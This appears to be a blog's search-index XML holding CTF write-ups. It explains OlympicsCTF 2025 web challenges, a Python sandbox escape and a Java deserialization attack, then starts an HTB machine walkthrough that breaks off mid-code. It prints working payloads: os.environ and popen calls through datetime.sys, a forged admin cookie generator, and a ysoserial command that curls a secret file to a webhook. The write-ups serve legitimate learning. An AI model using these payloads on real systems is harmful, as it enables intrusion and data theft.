<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>OlympicsCTF 2025</title>
    <link href="/2025/09/28/olympicsctf/"/>
    <url>/2025/09/28/olympicsctf/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20105013.png"></p><p>I participated in OlympicsCTF this year and managed to solve some challenges</p><h1 id="Vibe-Web-Mail"><a href="#Vibe-Web-Mail" class="headerlink" title="Vibe Web Mail"></a>Vibe Web Mail</h1><p>This challenge is about an SSTI vulnerability but there is a filter (sandbox) that you need to escape first.</p><p>I start by reading the docker file which has the flag in env variable:</p><div class="code-wrapper"><pre><code class="hljs dockerfile">...<span class="hljs-keyword">ENV</span> FLAG=FLAG&#123;ThisIsASampleFlagForTesting123&#125;<span class="hljs-keyword">COPY</span><span class="language-bash"> requirements.txt .</span><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install --no-cache-dir -r requirements.txt</span><span class="hljs-keyword">COPY</span><span class="language-bash"> app/. .</span><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">5000</span><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /app/static/images &amp;&amp; <span class="hljs-built_in">chown</span> -R webuser:webuser /app/static</span><span class="hljs-keyword">USER</span> webuser<span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;flask&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, <span class="hljs-string">&quot;--host&quot;</span>, <span class="hljs-string">&quot;0.0.0.0&quot;</span>]</span></code></pre></div><p>The app is a simple mail application, where you can send&#x2F;receive mails to users. Looking at the site, you will see a simple login page:</p><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20105738.png"></p><p>You can register and email and login with it, but at the source code i noticed the app itself registering 2 accounts when it starts</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_sample_users</span>():    <span class="hljs-keyword">from</span> models <span class="hljs-keyword">import</span> User    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> User.query.filter_by(email=<span class="hljs-string">&#x27;alice@example.com&#x27;</span>).first():        user1 = User(username=<span class="hljs-string">&#x27;alice&#x27;</span>, email=<span class="hljs-string">&#x27;alice@example.com&#x27;</span>, password=<span class="hljs-string">&#x27;password123&#x27;</span>)        user2 = User(username=<span class="hljs-string">&#x27;bob&#x27;</span>, email=<span class="hljs-string">&#x27;bob@example.com&#x27;</span>, password=<span class="hljs-string">&#x27;securepass&#x27;</span>)        db.session.add_all([user1, user2])        db.session.commit()        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Sample users created.&quot;</span>)    <span class="hljs-keyword">else</span>:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[=] Sample users already exist.&quot;</span>)...</code></pre></div><p>I used the two sample users and logged in with them. After a successful login you will be redirected to <code>/inbox</code> route where you receive your mails if someone send to you.<br>At the <code>/compose</code> route you can send mail to someone. I start by simply send a mail to the other user with a simple SSTI payload:</p><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20110956.png"></p><p>And i got this error message!<br><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20111203.png"></p><p>I ran the challenge locally to see what’s going on, i went to the docker logs and see this:</p><div class="code-wrapper"><pre><code class="hljs routeros">[2025-09-29 08:08:24,803] <span class="hljs-built_in">ERROR</span> <span class="hljs-keyword">in</span> utils: Template rendering error: TypeError(<span class="hljs-string">&quot;unhashable type: &#x27;set&#x27;&quot;</span>) <span class="hljs-keyword">while</span> evaluating <span class="hljs-string">&#x27;&#123;&#123;5*5&#125;&#125;&#x27;</span></code></pre></div><p>Interesting! i went to the utils file where the error come from and i saw the error comes exactly from this function</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_email_template</span>(<span class="hljs-params">template_str</span>):    <span class="hljs-keyword">try</span>:        template = safe_eval(template_str)        <span class="hljs-keyword">return</span> template    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        current_app.logger.error(<span class="hljs-string">f&quot;Template rendering error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></code></pre></div><p>As you can see there is a <code>safe_eval()</code> function that is used to render the template, we need to see where is this function got created. From the imports above you can see it’s from libs.</p><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20112059.png"></p><p>I went to the libs dir and found a <code>safe_eval.py</code> file. After reading the code, this file is like a sandbox used by the app to evaluate codes running as safe as possible.<br>I will show only the important parts of the file. It has a <code>safe_eval()</code> function that we saw in the utils file, so lets read it to see why it’s raising an error:</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_eval</span>(<span class="hljs-params">expr, globals_dict=<span class="hljs-literal">None</span>, locals_dict=<span class="hljs-literal">None</span>, mode=<span class="hljs-string">&quot;eval&quot;</span>, nocopy=<span class="hljs-literal">False</span>, locals_builtins=<span class="hljs-literal">False</span>, filename=<span class="hljs-literal">None</span></span>):    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(expr) <span class="hljs-keyword">is</span> CodeType:        <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;safe_eval does not allow direct evaluation of code objects.&quot;</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> nocopy:        <span class="hljs-keyword">if</span> (globals_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(globals_dict) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">dict</span>) \                <span class="hljs-keyword">or</span> (locals_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(locals_dict) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">dict</span>):            _logger.warning(                <span class="hljs-string">&quot;Looks like you are trying to pass a dynamic environment, &quot;</span>                <span class="hljs-string">&quot;you should probably pass nocopy=True to safe_eval().&quot;</span>)        <span class="hljs-keyword">if</span> globals_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:            globals_dict = <span class="hljs-built_in">dict</span>(globals_dict)        <span class="hljs-keyword">if</span> locals_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:            locals_dict = <span class="hljs-built_in">dict</span>(locals_dict)    check_values(globals_dict)    check_values(locals_dict)    <span class="hljs-keyword">if</span> globals_dict <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        globals_dict = &#123;&#125;    globals_dict[<span class="hljs-string">&#x27;__builtins__&#x27;</span>] = <span class="hljs-built_in">dict</span>(_BUILTINS)    <span class="hljs-keyword">if</span> locals_builtins:        <span class="hljs-keyword">if</span> locals_dict <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:            locals_dict = &#123;&#125;        locals_dict.update(_BUILTINS)    c = test_expr(expr, _SAFE_OPCODES, mode=mode, filename=filename)    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">return</span> unsafe_eval(c, globals_dict, locals_dict)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;%r while evaluating\n%r&#x27;</span> % (e, expr))</code></pre></div><p>There are some restriction in the code above to make sure that the user input is not doing anything malicious. The most important part is this line:<br><code>globals_dict[&#39;__builtins__&#39;] = dict(_BUILTINS)</code>.  </p><p>This line is making sure that the <code>__builtins__</code> is always assigned to a safe dict <code>_BUILTINS</code> mentioned above in the code that i will show in a sec.  This to make sure that users can’t access the global <code>__builtins__</code> and call sensitive functions to read files or execute commands on the system.  The safe <code>_BUILTINS</code> is like the following:</p><div class="code-wrapper"><pre><code class="hljs PYTHON">...<span class="hljs-keyword">import</span> datetime...unsafe_eval = <span class="hljs-built_in">eval</span>..._BUILTINS = &#123;    <span class="hljs-string">&#x27;datetime&#x27;</span>: datetime,    <span class="hljs-string">&#x27;True&#x27;</span>: <span class="hljs-literal">True</span>,    <span class="hljs-string">&#x27;False&#x27;</span>: <span class="hljs-literal">False</span>,    <span class="hljs-string">&#x27;None&#x27;</span>: <span class="hljs-literal">None</span>,    <span class="hljs-string">&#x27;bytes&#x27;</span>: <span class="hljs-built_in">bytes</span>,    <span class="hljs-string">&#x27;str&#x27;</span>: <span class="hljs-built_in">str</span>,    <span class="hljs-string">&#x27;unicode&#x27;</span>: <span class="hljs-built_in">str</span>,    <span class="hljs-string">&#x27;bool&#x27;</span>: <span class="hljs-built_in">bool</span>,    <span class="hljs-string">&#x27;int&#x27;</span>: <span class="hljs-built_in">int</span>,    <span class="hljs-string">&#x27;float&#x27;</span>: <span class="hljs-built_in">float</span>,    <span class="hljs-string">&#x27;enumerate&#x27;</span>: <span class="hljs-built_in">enumerate</span>,    <span class="hljs-string">&#x27;dict&#x27;</span>: <span class="hljs-built_in">dict</span>,    <span class="hljs-string">&#x27;list&#x27;</span>: <span class="hljs-built_in">list</span>,    <span class="hljs-string">&#x27;tuple&#x27;</span>: <span class="hljs-built_in">tuple</span>,    <span class="hljs-string">&#x27;map&#x27;</span>: <span class="hljs-built_in">map</span>,    <span class="hljs-string">&#x27;abs&#x27;</span>: <span class="hljs-built_in">abs</span>,    <span class="hljs-string">&#x27;min&#x27;</span>: <span class="hljs-built_in">min</span>,    <span class="hljs-string">&#x27;max&#x27;</span>: <span class="hljs-built_in">max</span>,    <span class="hljs-string">&#x27;sum&#x27;</span>: <span class="hljs-built_in">sum</span>,    <span class="hljs-string">&#x27;reduce&#x27;</span>: functools.reduce,    <span class="hljs-string">&#x27;filter&#x27;</span>: <span class="hljs-built_in">filter</span>,    <span class="hljs-string">&#x27;sorted&#x27;</span>: <span class="hljs-built_in">sorted</span>,    <span class="hljs-string">&#x27;round&#x27;</span>: <span class="hljs-built_in">round</span>,    <span class="hljs-string">&#x27;len&#x27;</span>: <span class="hljs-built_in">len</span>,    <span class="hljs-string">&#x27;repr&#x27;</span>: <span class="hljs-built_in">repr</span>,    <span class="hljs-string">&#x27;set&#x27;</span>: <span class="hljs-built_in">set</span>,    <span class="hljs-string">&#x27;all&#x27;</span>: <span class="hljs-built_in">all</span>,    <span class="hljs-string">&#x27;any&#x27;</span>: <span class="hljs-built_in">any</span>,    <span class="hljs-string">&#x27;ord&#x27;</span>: <span class="hljs-built_in">ord</span>,    <span class="hljs-string">&#x27;chr&#x27;</span>: <span class="hljs-built_in">chr</span>,    <span class="hljs-string">&#x27;divmod&#x27;</span>: <span class="hljs-built_in">divmod</span>,    <span class="hljs-string">&#x27;isinstance&#x27;</span>: <span class="hljs-built_in">isinstance</span>,    <span class="hljs-string">&#x27;range&#x27;</span>: <span class="hljs-built_in">range</span>,    <span class="hljs-string">&#x27;xrange&#x27;</span>: <span class="hljs-built_in">range</span>,    <span class="hljs-string">&#x27;zip&#x27;</span>: <span class="hljs-built_in">zip</span>,    <span class="hljs-string">&#x27;Exception&#x27;</span>: Exception,&#125;</code></pre></div><p>The safe dict doesn’t have any sensitive functions that we can use, even if it does, there are other functions that checks on user input preventing using of underscore <code>__</code> or any dangerous attributes. After spending some time trying to evade thees filters, the trick was pretty simple. </p><p>I start thinking, what if the <strong>functions&#x2F;classes&#x2F;modules</strong> mentioned in the safe <code>_BUILTINS</code> dict has access on dangerous attributes that we can use to execute commands??!</p><p>looking at the safe <code>_BUILTINS</code> dict which contains the functions&#x2F;modules we can use, hopping to see if any of them has access on sensitive attributes. I start with the <code>datetime</code> module since it’s the only module exist in the dict and cause the <code>hasattr()</code> function doesn’t exist, we goona ise the <code>repr()</code> function instead.</p><p>We gonna send a simple mail containing this message: <code>repr(datetime.sys)</code> to see if the <code>datetime</code> module has the <code>.sys</code> attribute or not. The output we are looking for is something like <code>&lt;module &#39;sys&#39; (built-in)&gt;</code>. By sending the mail, login to the other account to the see the output:</p><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20123303.png"></p><p>Yes! the module has the <code>sys</code> attribute. Now we can simply build the payload and get the flag.</p><p>By sending this payload in the message mail <code>datetime.sys.modules[&#39;os&#39;].environ[&#39;FLAG&#39;]</code> and login to the other account to see the output, you will get the flag.</p><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20123755.png"></p><h1 id="Vibe-Web-Mail-𝟚"><a href="#Vibe-Web-Mail-𝟚" class="headerlink" title="Vibe Web Mail 𝟚"></a>Vibe Web Mail 𝟚</h1><p>There was a second version of this challenge, i don’t know why?? maybe someone solve the first unintended. It was the same code as the previous one, the only thing changes is the docker file. Instead of assign the flag in an env variable, the flag is read by a <code>readflag.c</code> file and placed in the root dir with a random name:</p><div class="code-wrapper"><pre><code class="hljs r">...COPY requirements.txt .RUN pip install <span class="hljs-operator">-</span><span class="hljs-operator">-</span>no<span class="hljs-operator">-</span>cache<span class="hljs-operator">-</span>dir <span class="hljs-operator">-</span>r requirements.txtCOPY app<span class="hljs-operator">/</span>. .COPY readflag.c <span class="hljs-operator">/</span>RUN BINARY_NAME<span class="hljs-operator">=</span><span class="hljs-operator">$</span><span class="hljs-punctuation">(</span>cat <span class="hljs-operator">/</span>dev<span class="hljs-operator">/</span>urandom <span class="hljs-operator">|</span> tr <span class="hljs-operator">-</span>dc <span class="hljs-string">&#x27;a-z0-9&#x27;</span> <span class="hljs-operator">|</span> head <span class="hljs-operator">-</span><span class="hljs-built_in">c</span> <span class="hljs-number">32</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-punctuation">\</span>    gcc <span class="hljs-operator">-</span>o <span class="hljs-operator">/</span><span class="hljs-operator">$</span>BINARY_NAME <span class="hljs-operator">/</span>readflag.c <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-punctuation">\</span>    chmod <span class="hljs-number">0111</span> <span class="hljs-operator">/</span><span class="hljs-operator">$</span>BINARY_NAME <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-punctuation">\</span>    rm <span class="hljs-operator">/</span>readflag.c...</code></pre></div><p>Since we solve the previous one as intended, we have a free flag here.  Same as the previous exploit, all you need is to list the files in the root dir and read the flag</p><ol><li><code>datetime.sys.modules[&#39;os&#39;].listdir(&#39;/&#39;)</code></li></ol><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20125440.png"></p><ol start="2"><li><code>datetime.sys.modules[&#39;os&#39;].popen(&#39;/mpwv7nph42b0tlspdnihe34q45gke6tq&#39;).read()</code></li></ol><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20125602.png"></p><h1 id="Secret-Formula"><a href="#Secret-Formula" class="headerlink" title="Secret Formula"></a>Secret Formula</h1><p>This challenge was a simple JAVA deserialization attack. When you go to the challenge url you will see a login page. By registering a new user an login, you will get a cookie:</p><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20153321.png" alt="image"></p><p>Viewing the source code, it’s a single java file (i will only show the important parts)</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;    <span class="hljs-keyword">private</span> String email;    <span class="hljs-keyword">private</span> String name;    <span class="hljs-keyword">private</span> String password;    <span class="hljs-keyword">private</span> String lastIp;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String email, String name, String password, String ip)</span>&#123;        <span class="hljs-built_in">this</span>.email = email;        <span class="hljs-built_in">this</span>.name = name;        <span class="hljs-built_in">this</span>.password = password;        <span class="hljs-built_in">this</span>.lastIp = ip;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.email;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLastIp</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.lastIp;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkPassword</span><span class="hljs-params">(String pass)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password.equals(pass);    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;    &#125;&#125;</code></pre></div><p>We have a user object that contains four attributes (email, name, password, ip)</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">generateCookie</span><span class="hljs-params">(User user)</span> <span class="hljs-keyword">throws</span> IOException &#123;    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);    oos.writeObject(user);    oos.close();    <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());&#125;<span class="hljs-keyword">private</span> User <span class="hljs-title function_">extractUser</span><span class="hljs-params">(String encoded)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;    <span class="hljs-type">byte</span>[] data = Base64.getDecoder().decode(encoded);    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data));    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) ois.readObject();    ois.close();    <span class="hljs-keyword">return</span> user;&#125;</code></pre></div><p>The <code>generateCookie()</code> method takes the <code>User</code> object, serializes it into a byte stream, and then Base64 encodes it to generate a cookie. The <code>extractUser()</code> method dose the exact opposite.  </p><p>The thing is, when using <code>ObjectInputStream.readObject()</code> method on untrusted data, like a cookie that can be modified by a user is notoriously dangerous. An attacker can create their own serialized Java object, encode it, and send it in the cookie. When the server deserializes it, it can lead to Remote Code Execution (RCE).  </p><p>Following the code:</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;/secretformula&quot;</span>.equals(path)) &#123;            Cookie[] cookies = request.getCookies();            <span class="hljs-keyword">if</span>(cookies != <span class="hljs-literal">null</span>)&#123;                <span class="hljs-keyword">for</span>(Cookie c : cookies)&#123;                    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;user&quot;</span>.equals(c.getName()))&#123;                        <span class="hljs-keyword">try</span>&#123;                            <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> extractUser(c.getValue());                            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;Admin@admin.com&quot;</span>.equals(u.getEmail()))&#123;                                response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);                                response.getWriter().println(<span class="hljs-string">&quot;&lt;h2&gt;&quot;</span>+extractSecretForumlaFromSafeBox()+<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>);                                <span class="hljs-keyword">return</span>;                            &#125;                        &#125; <span class="hljs-keyword">catch</span>(Exception e)&#123;                             <span class="hljs-keyword">return</span>;                        &#125;                    &#125;                &#125;            &#125;</code></pre></div><p>The <code>/secretformula</code> endpoint is restricted only to users who has the <code>Admin@admin.com</code> email in their cookie after deserialization and then print the <code>extractSecretForumlaFromSafeBox()</code> method’s content on the page.</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">extractSecretForumlaFromSafeBox</span><span class="hljs-params">()</span>&#123;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/safebox/secretformula_for_plankton.txt&quot;</span>)));    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error&quot;</span>;    &#125;&#125;</code></pre></div><p>The <code>extractSecretForumlaFromSafeBox()</code> method reads the content of the <code>secretformula_for_plankton.txt</code> that content is rendered later in the <code>/secretformula</code> route. That file actually contain a fake flag, i did know that from the source code i downloaded. You will get two files:  </p><ol><li><code>secretformula_for_plankton.txt</code> &#x3D;&gt; contain the fake flag.  </li><li><code>secretformula.txt</code> &#x3D;&gt; contain the real flag.</li></ol><p>Okay, to access the <code>/secretformula</code> route, we need to use <code>Admin@admin.com</code> email. If you just use that in the login page, it will fail. In the code there is that line:</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">email</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;email&quot;</span>).toLowerCase();</code></pre></div><p>The code is simply takes the email parameter and turn it into lowercase, so we need to modify a cookie and assign the <code>Admin@admin.com</code> email into it.  </p><p>To do that, i made a simple java code that generate arbitrary cookie and used it in an online compiler.  </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<span class="hljs-keyword">import</span> java.io.Serializable;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;    <span class="hljs-keyword">private</span> String email;    <span class="hljs-keyword">private</span> String name;    <span class="hljs-keyword">private</span> String password;    <span class="hljs-keyword">private</span> String lastIp;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String email, String name, String password, String ip)</span>&#123;        <span class="hljs-built_in">this</span>.email = email;        <span class="hljs-built_in">this</span>.name = name;        <span class="hljs-built_in">this</span>.password = password;        <span class="hljs-built_in">this</span>.lastIp = ip;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.email;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLastIp</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.lastIp;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkPassword</span><span class="hljs-params">(String pass)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password.equals(pass);    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;    &#125;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">User</span> <span class="hljs-variable">maliciousUser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Admin@admin.com&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>);        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(maliciousUser);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">cookieValue</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        System.out.println(<span class="hljs-string">&quot;cookie:&quot;</span>);        System.out.println(cookieValue);    &#125;&#125;</code></pre></div><p>When running the above code, you will get a cookie that you can use on <code>/secretformula</code> route.</p><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20160420.png" alt="Fake Flag"></p><p>How we can get the real flag? We need to trigger an RCE through a deserialization attack.</p><p>I used the <code>ysoserial-all.jar</code> tool for that exploit and the <code>CommonsCollections</code> library, assuming the server using it because it’s very common. I also noticed we can’t cat the flag, so we need to send it remotely. </p><p>The final command will be like this:<br><code>java -jar ysoserial-all.jar CommonsCollections5 &quot;curl &lt;WEBHOOK&gt; -d @/safebox/secretformula.txt&quot; &gt; test.bin</code> then base64 the resulted file by: <code>base64 -w 0 test.bin</code>. </p><p>Then you will get a cookie you can use. The server will deserialize the cookie, read the <code>secretformula.txt</code> which contain the real flag and send it to our webhook</p><p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20162440.png" alt="Flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Environment Machine (Medium)</title>
    <link href="/2025/09/06/htb-m/environment/"/>
    <url>/2025/09/06/htb-m/environment/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/htb-m/environment/1.png"></p><p>I’m gonna walk through how I solved the <strong>Environment</strong> machine. It’s a Linux machine, a <strong>medium</strong> one on HackTheBox.</p><h1 id="I-Reconnaissance"><a href="#I-Reconnaissance" class="headerlink" title="I Reconnaissance"></a>I Reconnaissance</h1><p>I start with a simple nmap scan <code>nmap -Pn -sV -T4 -p- -sC 10.10.11.67</code>:</p><p><img src="/images/htb-m/environment/Screenshot%202025-09-06%20175105.png"></p><p>Port 80 and 22 are opened.</p><p>I grabbed the IP and setup the <code>/etc/hosts</code> file with it and the domain provided by the browser. I requested the domain and a single, simple page showed up:<br><img src="/images/htb-m/environment/Pasted%20image%2020250724160933.png"></p><p>The page is literally empty and has nothing on, even the email join function at the bottom has nothing interesting to test for.<br>I opened the html source code to see if there are JS files that has anything interesting and i found this piece of code:</p><div class="code-wrapper"><pre><code class="hljs JAVASCRIPT"><span class="hljs-keyword">const</span> email = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;email&#x27;</span>).<span class="hljs-property">value</span>;<span class="hljs-keyword">const</span> csrfToken = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;_token&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<span class="hljs-keyword">const</span> responseMessage = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;responseMessage&#x27;</span>);<span class="hljs-keyword">try</span> &#123;    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/mailing&#x27;</span>, &#123;        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,        <span class="hljs-attr">headers</span>: &#123;            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,        &#125;,                <span class="hljs-attr">body</span>: <span class="hljs-string">&quot;email=&quot;</span> + email + <span class="hljs-string">&quot;&amp;_token=&quot;</span> + csrfToken,    &#125;);    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();        responseMessage.<span class="hljs-property">textContent</span> = data.<span class="hljs-property">message</span>; <span class="hljs-comment">// Display success message</span>        responseMessage.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">&#x27;greenyellow&#x27;</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">const</span> errorData = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();        responseMessage.<span class="hljs-property">textContent</span> = errorData.<span class="hljs-property">message</span> || <span class="hljs-string">&#x27;An error occurred.&#x27;</span>;        responseMessage.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">&#x27;red&#x27;</span>;    &#125;&#125; <span class="hljs-keyword">catch</span> (error) &#123;    responseMessage.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Failed to send the request.&#x27;</span>;    responseMessage.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span 